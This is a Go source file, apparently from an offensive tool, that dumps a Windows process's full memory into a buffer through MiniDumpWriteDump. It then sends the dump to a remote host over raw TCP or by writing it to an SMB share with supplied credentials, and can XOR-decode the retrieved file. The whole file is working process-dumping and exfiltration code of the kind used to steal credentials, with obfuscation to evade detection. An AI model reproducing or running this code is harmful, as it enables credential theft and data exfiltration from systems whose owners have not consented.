package main

import (
	"fmt"
	"github.com/hirochachacha/go-smb2"
	"golang.org/x/sys/windows"
	"net"
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"unsafe"
)

var (
	dbghelpDLL        = syscall.NewLazyDLL("Dbghelp.dll")
	miniDumpWriteDump = dbghelpDLL.NewProc("MiniDumpWriteDump")
)

const (
	ErrReadWriteOnly = "Only part of a ReadProcessMemory or WriteProcessMemory request was completed."
)

func MiniDumpGetBytes(hProc windows.Handle) error {
	callback := syscall.NewCallback(miniDumpCallback)
	var newCallbackRoutine MINIDUMP_CALLBACK_INFORMATION
	newCallbackRoutine.CallbackParam = 0
	newCallbackRoutine.CallbackRoutine = callback
	ret, _, err := miniDumpWriteDump.Call(
		uintptr(hProc),
		0,
		uintptr(0),
		uintptr(MiniDumpWithFullMemory),
		0,
		0,
		uintptr(unsafe.Pointer(&newCallbackRoutine)),
	)
	if ret != 1 && err != nil && err.Error() != ErrReadWriteOnly {
		return CreateError(err)
	}
	return nil
}

func SendBytesRaw(ip string, port int) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, port))
	if err != nil {
		return CreateError(err)
	}
	defer conn.Close()

	totalSize := len(dumpBuffer)
	bytesSent := 0

	for bytesSent < totalSize {
		end := bytesSent + 4096
		if end > totalSize {
			end = totalSize
		}

		chunk := dumpBuffer[bytesSent:end]

		n, err := conn.Write(chunk)
		if err != nil {
			return CreateError(err)
		}
		bytesSent += n
	}
	return nil
}

func SendBytesSMB(ip string, username string, password string, shareName string, dumpName string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", ip))
	if err != nil {
		return CreateError(err)
	}
	defer conn.Close()
	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     username,
			Password: password,
		},
	}
	s, err := d.Dial(conn)
	if err != nil {
		return CreateError(err)
	}
	defer s.Logoff()

	fs, err := s.Mount(shareName)
	if err != nil {
		return CreateError(err)
	}
	defer fs.Umount()

	f, err := fs.Create(dumpName)
	if err != nil {
		return CreateError(err)
	}
	defer f.Close()

	if _, err = f.Write(dumpBuffer); err != nil {
		return CreateError(err)
	}
	return nil
}

func DeobfuscateDump(dumpName string, key string) (string, error) {
	dumpXorData, err := os.ReadFile(dumpName)
	if err != nil {
		return "", CreateError(err)
	}
	xor(&dumpXorData, []byte(key))
	ext := filepath.Ext(dumpName)
	filename := strings.TrimSuffix(dumpName, ext)
	newFileName := fmt.Sprintf("%s_%s%s", filename, "unxored", ext)
	file, err := os.Create(newFileName)
	if err != nil {
		return "", CreateError(err)
	}
	if _, err = file.Write(dumpXorData); err != nil {
		return "", CreateError(err)

	}
	return newFileName, nil
}
